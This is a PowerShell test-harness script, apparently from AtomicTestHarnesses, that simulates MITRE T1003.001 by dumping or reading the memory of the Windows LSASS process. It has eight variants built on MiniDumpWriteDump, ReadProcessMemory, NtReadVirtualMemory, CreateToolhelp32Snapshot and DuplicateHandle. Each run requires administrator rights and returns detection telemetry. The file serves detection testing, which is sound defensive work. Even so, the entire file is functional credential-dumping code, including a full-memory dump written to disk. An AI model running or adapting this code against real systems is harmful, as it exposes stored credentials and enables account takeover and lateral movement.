if (-not ('AtomicTestHarnesses.ProcessNativeMethods' -as [Type])) {
    $TypeDef = @'
using System;
using System.Runtime.InteropServices;
namespace AtomicTestHarnesses {
    [Flags]
    public enum MiniDumpType {
        MiniDumpNormal = 0x00000000,
        MiniDumpWithDataSegs = 0x00000001,
        MiniDumpWithFullMemory = 0x00000002,
        MiniDumpWithHandleData = 0x00000004,
        MiniDumpFilterMemory = 0x00000008,
        MiniDumpScanMemory = 0x00000010,
        MiniDumpWithUnloadedModules = 0x00000020,
        MiniDumpWithIndirectlyReferencedMemory = 0x00000040,
        MiniDumpFilterModulePaths = 0x00000080,
        MiniDumpWithProcessThreadData = 0x00000100,
        MiniDumpWithPrivateReadWriteMemory = 0x00000200,
        MiniDumpWithoutOptionalData = 0x00000400,
        MiniDumpWithFullMemoryInfo = 0x00000800,
        MiniDumpWithThreadInfo = 0x00001000,
        MiniDumpWithCodeSegs = 0x00002000,
        MiniDumpWithoutAuxiliaryState = 0x00004000,
        MiniDumpWithFullAuxiliaryState = 0x00008000,
        MiniDumpWithPrivateWriteCopyMemory = 0x00010000,
        MiniDumpIgnoreInaccessibleMemory = 0x00020000,
        MiniDumpWithTokenInformation = 0x00040000,
        MiniDumpWithModuleHeaders = 0x00080000,
        MiniDumpFilterTriage = 0x00100000,
        MiniDumpWithAvxXStateContext = 0x00200000,
        MiniDumpWithIptTrace = 0x00400000,
        MiniDumpScanInaccessiblePartialPages = 0x00800000,
        MiniDumpFilterWriteCombinedMemory,
        MiniDumpValidTypeFlags = 0x01ffffff
    }

    [Flags]
    public enum SnapshotFlags {
    Process = 0x00000002
    }

    [Flags]
    public enum ProcessAccess {
        AllAccess = 0x001FFFFF,
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VirtualMemoryOperation = 0x00000008,
        VirtualMemoryRead = 0x00000010,
        VirtualMemoryWrite = 0x00000020,
        DuplicateHandle = 0x00000040,
        CreateProcess = 0x000000080,
        SetQuota = 0x00000100,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        QueryLimitedInformation = 0x00001000,
        Synchronize = 0x00100000
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct PROCESSENTRY32
    {
        public const int MAX_PATH = 260;
        public UInt32 dwSize;
        public UInt32 cntUsage;
        public UInt32 th32ProcessID;
        public IntPtr th32DefaultHeapID;
        public UInt32 th32ModuleID;
        public UInt32 cntThreads;
        public UInt32 th32ParentProcessID;
        public  Int32 pcPriClassBase;
        public UInt32 dwFlags;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = MAX_PATH)]
        public string szExeFile;
    }

    public class ProcessNativeMethods {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            ProcessAccess processAccess,
            bool bInheritHandle,
            int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool DuplicateHandle(
            IntPtr hSourceProcessHandle,
            IntPtr hSourceHandle,
            IntPtr hTargetProcessHandle,
            ref IntPtr lpTargetHandle,
            ProcessAccess DesiredAccess,
            [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle,
            UInt32 dwOptions);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(
            IntPtr hProcess, 
			IntPtr lpBaseAddress,
			IntPtr lpBuffer,
			UInt32 dwSize, 
			ref UInt32 lpNumberOfBytesRead);

        [DllImport("kernelbase.dll", EntryPoint = "ReadProcessMemory", SetLastError = true)]
        public static extern bool KernelbaseReadProcessMemory(
            IntPtr hProcess, 
			IntPtr lpBaseAddress,
			IntPtr lpBuffer,
			UInt32 dwSize, 
			ref UInt32 lpNumberOfBytesRead);

        [DllImport("api-ms-win-core-memory-l1-1-0", EntryPoint = "ReadProcessMemory", SetLastError = true)]
        public static extern bool ApisetReadProcessMemory(
            IntPtr hProcess, 
			IntPtr lpBaseAddress,
			IntPtr lpBuffer,
			UInt32 dwSize, 
			ref UInt32 lpNumberOfBytesRead);
            
        [DllImport("ntdll.dll", SetLastError=true)]
        public static extern bool NtReadVirtualMemory(
            IntPtr ProcessHandle, 
            IntPtr BaseAddress, 
            IntPtr Buffer, 
            UInt32 NumberOfBytesToRead, 
            ref UInt32 NumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr CreateToolhelp32Snapshot(
        SnapshotFlags dwFlags, 
        uint th32ProcessID);

        [DllImport("Dbghelp.dll", SetLastError = true)]
        public static extern bool MiniDumpWriteDump(
            IntPtr hProcess, 
            uint ProcessId, 
            IntPtr hFile, 
            MiniDumpType DumpType, 
            IntPtr ExceptionParam, 
            IntPtr UserStreamParam, 
            IntPtr CallbackParam);

        [DllImport("Dbgcore.dll", EntryPoint = "MiniDumpWriteDump", SetLastError = true)]
        public static extern bool DbgcoreMiniDumpWriteDump(
            IntPtr hProcess, 
            uint ProcessId, 
            IntPtr hFile, 
            MiniDumpType DumpType, 
            IntPtr ExceptionParam, 
            IntPtr UserStreamParam, 
            IntPtr CallbackParam);

        [DllImport("kernel32", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        public static extern bool Process32First(
            IntPtr hSnapshot, 
            ref PROCESSENTRY32 lppe);

        [DllImport("kernel32", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        public static extern bool Process32Next(
            IntPtr hSnapshot, 
            ref PROCESSENTRY32 lppe);

       [DllImport("kernel32.dll", SetLastError = true)]
       public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateFile(
            String lpFileName,
            UInt32 dwDesiredAccess,
            UInt32 dwShareMode,
            IntPtr lpSecurityAttributes,
            UInt32 dwCreationDisposition,
            UInt32 dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError=true)]
            public static extern bool CloseHandle(
                IntPtr hHandle);
    }
}
'@
Add-Type -TypeDefinition $TypeDef
}
function Invoke-ATHDumpLSASS {
<#
    .SYNOPSIS
    Test runner for dumping the LSASS process's memory.
    
    Technique ID: T1003.001 (OS Credential Dumping - LSASS)
    
    .DESCRIPTION
    Invoke-ATHDumpLSASS was designed to simulate dumping the LSASS process's memory on a local host. 
    
    .PARAMETER ProcessId
    Specifies the process id of the target process. This allows the user to specify the LSASS's process ID. 
    
    .PARAMETER AccessRights
    Specifies the access rights (AllAccess, 'QueryLimitedInformation', 'QueryInformation', 'VirtualMemoryRead', (QueryLimitedInformation, VirtualMemoryRead), (QueryInformation, VirtualMemoryRead)) the user wants to request when opening a handle to the target process.
    
    .PARAMETER DumpPath
    
    Specifies the filepath/filename of the memory dump. 

    .PARAMETER Variant
    
    Specifies the type of way the user wants to dump LSASS. 

    .PARAMETER DuplicateHandleAccessRights
    
    Specifies the that the user wants to invoke the DuplicateHandle API and pass in the DuplicateHandle access rights. 

    .PARAMETER TestGuid
    
    Optionally, specify a test GUID value to use to override the generated test GUID behavior. 
    
    .INPUTS
    System.Diagnostics.Process
    Invoke-ATHDumpLSASS accepts the output of Get-Process. Only one Process object should be supplied to Invoke-ATHDumpLSASS.
    Microsoft.Management.Infrastructure.CimInstance#root/cimv2/Win32_Process
    Invoke-ATHDumpLSASS accepts the output of a Win32_Process WMI object via Get-CimInstance.
    
    .OUTPUTS
    PSObject
    Outputs an object consisting of relevant execution details. The following object properties may be populated:
    * TechniqueID - Specifies the relevant MITRE ATT&CK Technique ID.
    * TestSuccess - Will be set to True if it was determined that the technique executed successfully. 
    * TestGuid - Specifies the test GUID that was used for the test.
    * TestCommand - Specifies the command-line arguments used to perform the test.
    * Variant - Specifies the type of way the user wants to dump LSASS. 
    * SourceUser - Specifies the user that the current thread.
    * SourceExecutableFilePath - Specifies the full path of the source executable. If the source executable is specified as a byte array, this property will be empty.
    * SourceExecutableFileHash - SHA256 hash of the source executable.
    * SourceProcessId - Specifies the process ID of the process performing the LSASS read.
    * GrantedRights - The process rights used to request a handle to the target process. 
    * TargetExecutablePath - Specifies the full path of the target executable.
    * TargetExecutableFileHash - SHA256 hash of the target executable.
    * TargetProcessId - The Process ID of LSASS. 
    * DumpPath - Specifies the type of way the user wants to dump LSASS. 

    .EXAMPLE
    Invoke-ATHDumpLSASS
    Reads LSASS's memory via Dbghelp!MiniDumpWriteDump

    .EXAMPLE
    Get-Process -name lsass | Invoke-ATHDumpLSASS
    Gets LSASS PID and passes it on to Invoke-ATHDumpLSASS to reads LSASS's memory
    
    .EXAMPLE
    Invoke-ATHDumpLSASS -AccessRights AllAccess
    Reads LSASS's memory and the  access rights as AllAccess.
    
    .EXAMPLE
    Get-Process -name lsass | Invoke-ATHDumpLSASS -AccessRights AllAccess
    Reads LSASS's memory and the  access rights as AllAccess.
    
    .EXAMPLE
    Invoke-ATHDumpLSASS -Variant Kernel32!ReadProcessMemory
    Reads LSASS's memory via the Kernel32!ReadProcessMemory function. 
#>

    param (
        [Parameter(ValueFromPipelineByPropertyName)]
        [Int32]
        [Alias('Id')]
        $ProcessId = (Get-Process -Name lsass)[0].Id,

        [Parameter(ParameterSetName = 'VariantString')]
        [ValidateSet('Dbghelp!MiniDumpWriteDump', 'Dbgcore!MiniDumpWriteDump', 'Kernel32!ReadProcessMemory', 'api-ms-win-core-memory-l1-1-0!ReadProcessMemory', 'Kernelbase!ReadProcessMemory', 'Kernel32!CreateToolhelp32Snapshot', 'DuplicateHandle', 'Ntdll!NtReadVirtualMemory')]
        [String]
        $Variant = 'Dbghelp!MiniDumpWriteDump',

        [Parameter()]
        [ValidateSet('AllAccess', 'QueryLimitedInformation', 'QueryInformation', 'VirtualMemoryRead', 'QueryLimitedInformation, VirtualMemoryRead', 'QueryInformation, VirtualMemoryRead')]
        [string]
        $AccessRights = 'QueryInformation, VirtualMemoryRead',

        [Parameter()]
        [string]
        $DuplicateHandleAccessRights = 'DuplicateHandle',

        [Parameter()]
        [string]
        $DumpPath = 'C:\TestHarness.dmp',

        [Parameter()]
        [Guid]
        $TestGuid = (New-Guid)
    )

        $IsAdministrator = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
        if ($IsAdministrator -eq $False){
            Write-Error "Insufficent privileges to perform operation. Please run as Administrator."
            return
        }

        $TestCommand = $MyInvocation
        $SourceProcessPath = $null
        $SourceUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $SHA256 = [Security.Cryptography.SHA256]::Create()
        $SourceProcessPath =  (Get-CimInstance -ClassName Win32_Process -Property ExecutablePath  -Filter "ProcessId=$PID").Path
        $ResolvedSourceFilePath = Resolve-Path -Path $SourceProcessPath -ErrorAction Stop
        $SourceExeBytes = [IO.File]::ReadAllBytes($ResolvedSourceFilePath.Path)
        $SourceExeHash = ($SHA256.ComputeHash($SourceExeBytes) | ForEach-Object { $_.ToString('X2') }) -join ''

        $TargetExecutablePath = $null
        $TargetExecutablePath = (Get-CimInstance -ClassName Win32_Process -Property ExecutablePath  -Filter "ProcessId=$ProcessId").Path
        $ResolvedTargetFilePath = Resolve-Path -Path $TargetExecutablePath -ErrorAction Stop
        $TargetExeBytes = [IO.File]::ReadAllBytes($ResolvedTargetFilePath.Path)
        $TargetExeHash = ($SHA256.ComputeHash($TargetExeBytes) | ForEach-Object { $_.ToString('X2') }) -join ''

        switch($Variant) {
            'Dbghelp!MiniDumpWriteDump' { 
                $ProcessHandle = [AtomicTestHarnesses.ProcessNativeMethods]::OpenProcess(
                    $AccessRights, 
                    $False,
                    $ProcessId
                );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if($ProcessHandle -eq [IntPtr]::Zero){
                    Write-Error $LastError
                    return
                }
            
                $hFile = [IntPtr]::Zero
                $hFile = [AtomicTestHarnesses.ProcessNativeMethods]::CreateFile($DumpPath, [System.IO.FileAccess]::Write, [System.IO.FileShare]::Write, [IntPtr]::Zero, [System.IO.FileMode]::Create, 0, [IntPtr]::Zero);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
        

                if($hFile -eq [IntPtr]::Zero){
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($ProcessHandle)
                    Write-Error $LastError
                    return
                }

                $MiniDump = [AtomicTestHarnesses.ProcessNativeMethods]::MiniDumpWriteDump(
                    $ProcessHandle, 
                    $ProcessId, 
                    $hFile, 
                    'MiniDumpWithFullMemory', 
                    [IntPtr]::Zero, 
                    [IntPtr]::Zero, 
                    [IntPtr]::Zero);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if($MiniDump -eq 0){
                    Write-Error $LastError
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($ProcessHandle)
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($hFile)
                    $FullPath = Resolve-Path -Path $DumpPath
                    $null = Remove-Item $FullPath -Force
                    return
                }

                else{
                    $TestSuccess = $true
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($ProcessHandle)
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($hFile)
                    $FullPath = Resolve-Path -Path $DumpPath
                    $null = Remove-Item $FullPath -Force
                }

                [PSCustomObject] @{
                    TechniqueID              = 'T1003.001'
                    Variant         = $Variant
                    TestSuccess              = $TestSuccess
                    TestGuid                 = $TestGuid
                    TestCommand              = $TestCommand.Line
                    SourceUser               = $SourceUser
                    SourceExecutableFilePath = $SourceProcessPath
                    SourceExecutableFileHash = $SourceExeHash
                    SourceProcessId          = $PID
                    GrantedRights            = $AccessRights
                    TargetExecutableFilePath = $TargetExecutablePath
                    TargetExecutableFileHash = $TargetExeHash
                    TargetProcessId          = $ProcessId
                    DumpFile                 = $DumpPath
                }

                break
            }
            'Kernel32!CreateToolhelp32Snapshot' {
                $SnapshotHandle =  [IntPtr]::Zero

                $SnapshotHandle = [AtomicTestHarnesses.ProcessNativeMethods]::CreateToolhelp32Snapshot(
                'Process',
                0
                );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
                if($SnapshotHandle -eq [IntPtr]::Zero){
                    Write-Error $LastError
                    return
                }

                $procEntry = New-Object -TypeName AtomicTestHarnesses.PROCESSENTRY32
                $procEntry.dwSize = [System.Runtime.InteropServices.Marshal]::SizeOf($procEntry)

                if([AtomicTestHarnesses.ProcessNativeMethods]::Process32First($SnapshotHandle, [ref]$procEntry)){
                    while("lsass.exe" -ne $procEntry.szExeFile){
                        $Next = [AtomicTestHarnesses.ProcessNativeMethods]::Process32Next($SnapshotHandle,  [ref]$procEntry)
                        $processName = $procEntry.szExeFile
                        $LsassId = $procEntry.th32ProcessID
                        }
                }
                else{
                    Write-Error $LastError
                    return
                }

                $ProcessHandle = [AtomicTestHarnesses.ProcessNativeMethods]::OpenProcess(
                    $AccessRights, 
                    $False,
                    $LsassId
                );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if($ProcessHandle -eq [IntPtr]::Zero){
                    Write-Error $LastError
                    return
                }

                $hFile = [IntPtr]::Zero
                $hFile = [AtomicTestHarnesses.ProcessNativeMethods]::CreateFile($DumpPath, [System.IO.FileAccess]::Write, [System.IO.FileShare]::Write, [IntPtr]::Zero, [System.IO.FileMode]::Create, 0, [IntPtr]::Zero);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if($hFile -eq [IntPtr]::Zero){
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($ProcessHandle)
                    Write-Error $LastError
                    return
                }

                $MiniDump = [AtomicTestHarnesses.ProcessNativeMethods]::MiniDumpWriteDump(
                    $ProcessHandle, 
                    $ProcessId, 
                    $hFile, 
                    'MiniDumpWithFullMemory', 
                    [IntPtr]::Zero, 
                    [IntPtr]::Zero, 
                    [IntPtr]::Zero);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if($MiniDump -eq 0){
                    Write-Error $LastError
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($SnapshotHandle)  
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($ProcessHandle)
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($hFile)
                    $FullPath = Resolve-Path -Path $DumpPath
                    $null = Remove-Item $FullPath -Force
                    return
                }
                else{
                    $TestSuccess = $true
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($SnapshotHandle)  
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($ProcessHandle)  
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($hFile)
                    $FullPath = Resolve-Path -Path $DumpPath
                    $null = Remove-Item $FullPath -Force
                }

                [PSCustomObject] @{
                    TechniqueID              = 'T1003.001'
                    Variant         = $Variant
                    TestSuccess              = $TestSuccess
                    TestGuid                 = $TestGuid
                    TestCommand              = $TestCommand.Line
                    SourceUser               = $SourceUser
                    SourceExecutableFilePath = $SourceProcessPath
                    SourceExecutableFileHash = $SourceExeHash
                    SourceProcessId          = $PID
                    GrantedRights            = $AccessRights
                    TargetExecutableFilePath = $TargetExecutablePath
                    TargetExecutableFileHash = $TargetExeHash
                    TargetProcessId          = $ProcessId
                    DumpFile                 = $DumpPath
                }
                
                break
            }
            'Kernel32!ReadProcessMemory' { 

                $ProcessHandle = [AtomicTestHarnesses.ProcessNativeMethods]::OpenProcess(
                    $AccessRights, 
                    $False,
                    $ProcessId
                );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if($ProcessHandle -eq [IntPtr]::Zero){
                    Write-Error $LastError
                    return
                }
                $BytesRead = 0
                [IntPtr]$lpBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1024) #Get Proper Size of process memory to avoid errors regarding the size of buffer. Ie Buffer is too small to handle LSASS mem. 
                $lpBaseAddress = (Get-Process -Name lsass -Module)[0].BaseAddress
                $Success = [AtomicTestHarnesses.ProcessNativeMethods]::ReadProcessMemory(
                    $ProcessHandle,
                    $lpBaseAddress,
                    $lpBuffer, 
                    1024,
                    [ref]$BytesRead
                );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if($Success -eq 0){
                    Write-Error $LastError
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($ProcessHandle);
                    $Free = [System.Runtime.InteropServices.Marshal]::FreeHGlobal($lpBuffer) 
                    return
                }
                else{
                    $TestSuccess = $true
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($ProcessHandle)    
                    $Free = [System.Runtime.InteropServices.Marshal]::FreeHGlobal($lpBuffer)  
                } 

                [PSCustomObject] @{
                    TechniqueID              = 'T1003.001'
                    Variant         = $Variant
                    TestSuccess              = $TestSuccess
                    TestGuid                 = $TestGuid
                    TestCommand              = $TestCommand.Line
                    SourceUser               = $SourceUser
                    SourceExecutableFilePath = $SourceProcessPath
                    SourceExecutableFileHash = $SourceExeHash
                    SourceProcessId          = $PID
                    GrantedRights            = $AccessRights
                    TargetExecutableFilePath = $TargetExecutablePath
                    TargetExecutableFileHash = $TargetExeHash
                    TargetProcessId          = $ProcessId
                    DumpFile                 = $null
                }                
                
                break
            }
            'Dbgcore!MiniDumpWriteDump' {
                
                $ProcessHandle = [AtomicTestHarnesses.ProcessNativeMethods]::OpenProcess(
                    $AccessRights, 
                    $False,
                    $ProcessId
                );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if($ProcessHandle -eq [IntPtr]::Zero){
                    Write-Error $LastError
                    return
                }
            
                $hFile = [IntPtr]::Zero
                $hFile = [AtomicTestHarnesses.ProcessNativeMethods]::CreateFile($DumpPath, [System.IO.FileAccess]::Write, [System.IO.FileShare]::Write, [IntPtr]::Zero, [System.IO.FileMode]::Create, 0, [IntPtr]::Zero);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
        

                if($hFile -eq [IntPtr]::Zero){
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($ProcessHandle)
                    Write-Error $LastError
                    return
                }

                $MiniDump = [AtomicTestHarnesses.ProcessNativeMethods]::DbgcoreMiniDumpWriteDump(
                    $ProcessHandle, 
                    $ProcessId, 
                    $hFile, 
                    'MiniDumpWithFullMemory', 
                    [IntPtr]::Zero, 
                    [IntPtr]::Zero, 
                    [IntPtr]::Zero);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if($MiniDump -eq 0){
                    Write-Error $LastError
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($ProcessHandle)  
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($hFile)
                    $FullPath = Resolve-Path -Path $DumpPath
                    $null = Remove-Item $FullPath -Force
                    return
                }

                else{
                    $TestSuccess = $true
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($ProcessHandle)  
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($hFile)
                    $FullPath = Resolve-Path -Path $DumpPath
                    $null = Remove-Item $FullPath -Force
                }

                [PSCustomObject] @{
                    TechniqueID              = 'T1003.001'
                    Variant         = $Variant
                    TestSuccess              = $TestSuccess
                    TestGuid                 = $TestGuid
                    TestCommand              = $TestCommand.Line
                    SourceUser               = $SourceUser
                    SourceExecutableFilePath = $SourceProcessPath
                    SourceExecutableFileHash = $SourceExeHash
                    SourceProcessId          = $PID
                    GrantedRights            = $AccessRights
                    TargetExecutableFilePath = $TargetExecutablePath
                    TargetExecutableFileHash = $TargetExeHash
                    TargetProcessId          = $ProcessId
                    DumpFile                 = $DumpPath
                }

                break
            }
            'api-ms-win-core-memory-l1-1-0!ReadProcessMemory' { 
                
                $ProcessHandle = [AtomicTestHarnesses.ProcessNativeMethods]::OpenProcess(
                    $AccessRights, 
                    $False,
                    $ProcessId
                );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if($ProcessHandle -eq [IntPtr]::Zero){
                    Write-Error $LastError
                    return
                }
                $BytesRead = 0
                [IntPtr]$lpBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1024) 
                $lpBaseAddress = (Get-Process -Name lsass -Module)[0].BaseAddress
                $Success = [AtomicTestHarnesses.ProcessNativeMethods]::ApisetReadProcessMemory(
                    $ProcessHandle,
                    $lpBaseAddress,
                    $lpBuffer, 
                    1024,
                    [ref]$BytesRead
                );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if($Success -eq 0){
                    Write-Error $LastError
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($ProcessHandle);
                    $Free = [System.Runtime.InteropServices.Marshal]::FreeHGlobal($lpBuffer) 
                    return
                }
                else{
                    $TestSuccess = $true
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($ProcessHandle)    
                    $Free = [System.Runtime.InteropServices.Marshal]::FreeHGlobal($lpBuffer)  
                } 

                [PSCustomObject] @{
                    TechniqueID              = 'T1003.001'
                    Variant                  = $Variant
                    TestSuccess              = $TestSuccess
                    TestGuid                 = $TestGuid
                    TestCommand              = $TestCommand.Line
                    SourceUser               = $SourceUser
                    SourceExecutableFilePath = $SourceProcessPath
                    SourceExecutableFileHash = $SourceExeHash
                    SourceProcessId          = $PID
                    GrantedRights            = $AccessRights
                    TargetExecutableFilePath = $TargetExecutablePath
                    TargetExecutableFileHash = $TargetExeHash
                    TargetProcessId          = $ProcessId
                    DumpFile                 = $null
                }            
                
                break
            }
            'Kernelbase!ReadProcessMemory' {
            
                $ProcessHandle = [AtomicTestHarnesses.ProcessNativeMethods]::OpenProcess(
                    $AccessRights, 
                    $False,
                    $ProcessId
                );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if($ProcessHandle -eq [IntPtr]::Zero){
                    Write-Error $LastError
                    return
                }
                $BytesRead = 0
                [IntPtr]$lpBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1024) #Get Proper Size of process memory to avoid errors regarding the size of buffer. Ie Buffer is too small to handle LSASS mem. 
                $lpBaseAddress = (Get-Process -Name lsass -Module)[0].BaseAddress
                $Success = [AtomicTestHarnesses.ProcessNativeMethods]::KernelbaseReadProcessMemory(
                    $ProcessHandle,
                    $lpBaseAddress,
                    $lpBuffer, 
                    1024,
                    [ref]$BytesRead
                );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if($Success -eq 0){
                    Write-Error $LastError
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($ProcessHandle);
                    $Free = [System.Runtime.InteropServices.Marshal]::FreeHGlobal($lpBuffer) 
                    return
                }
                else{
                    $TestSuccess = $true
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($ProcessHandle)    
                    $Free = [System.Runtime.InteropServices.Marshal]::FreeHGlobal($lpBuffer)  
                } 

                [PSCustomObject] @{
                    TechniqueID              = 'T1003.001'
                    Variant                 = $Variant
                    TestSuccess              = $TestSuccess
                    TestGuid                 = $TestGuid
                    TestCommand              = $TestCommand.Line
                    SourceUser               = $SourceUser
                    SourceExecutableFilePath = $SourceProcessPath
                    SourceExecutableFileHash = $SourceExeHash
                    SourceProcessId          = $PID
                    GrantedRights            = $AccessRights
                    TargetExecutableFilePath = $TargetExecutablePath
                    TargetExecutableFileHash = $TargetExeHash
                    TargetProcessId          = $ProcessId
                    DumpFile                 = $null
                }            
                
                break
            }
            'Ntdll!NtReadVirtualMemory' {
                
                $ProcessHandle = [AtomicTestHarnesses.ProcessNativeMethods]::OpenProcess(
                    $AccessRights, 
                    $False,
                    $ProcessId
                );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if($ProcessHandle -eq [IntPtr]::Zero){
                    Write-Error $LastError
                    return
                }
           
                $BytesRead = 0
                [IntPtr]$lpBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1024) 
                $lpBaseAddress = (Get-Process -Name lsass -Module)[0].BaseAddress
                $Success = [AtomicTestHarnesses.ProcessNativeMethods]::NtReadVirtualMemory(
                    $ProcessHandle,
                    $lpBaseAddress,
                    $lpBuffer, 
                    1024,
                    [ref]$BytesRead
                );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if($Success -ne 0){
                    Write-Error $LastError
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($ProcessHandle);
                    $Free = [System.Runtime.InteropServices.Marshal]::FreeHGlobal($lpBuffer) 
                    return
                }
                else{
                    $TestSuccess = $true
                    $Close = [AtomicTestHarnesses.ProcessNativeMethods]::CloseHandle($ProcessHandle)
                    $Free = [System.Runtime.InteropServices.Marshal]::FreeHGlobal($lpBuffer) 
                }

                [PSCustomObject] @{
                    TechniqueID              = 'T1003.001'
                    Variant                  = $Variant
                    TestSuccess              = $TestSuccess
                    TestGuid                 = $TestGuid
                    TestCommand              = $TestCommand.Line
                    SourceUser               = $SourceUser
                    SourceExecutableFilePath = $SourceProcessPath
                    SourceExecutableFileHash = $SourceExeHash
                    SourceProcessId          = $PID
                    GrantedRights            = $AccessRights
                    TargetExecutableFilePath = $TargetExecutablePath
                    TargetExecutableFileHash = $TargetExeHash
                    TargetProcessId          = $ProcessId
                    DumpFile                 = $null
                }                
                
                break
            }
        }

} 